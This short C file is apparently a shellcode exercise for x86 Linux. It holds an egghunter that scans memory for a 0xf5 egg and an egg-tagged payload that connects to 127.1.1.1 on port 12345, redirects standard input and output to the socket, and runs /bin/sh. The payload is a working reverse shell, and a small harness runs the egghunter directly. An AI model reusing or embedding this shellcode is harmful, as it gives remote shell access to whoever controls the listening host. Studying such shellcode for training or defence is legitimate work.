#include<stdio.h>
#include<string.h>

// egg = CMC
#define egg "\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5"

unsigned char egghunter[] = "\x31\xc9\x66\x81\xc1\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xee\xb8\xf5\xf5\xf5\xf5\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";

unsigned char code[] = egg "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x6a\x02\x89\xe1\x66\xb8\x6a\x01\xb2\x10\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc9\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\xcd\x80";
int main()
{
  printf("Shellcode egghunter lenght: %d\n", strlen(egghunter));
	printf("Shellcode code Length with egg:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();
	return 0;
}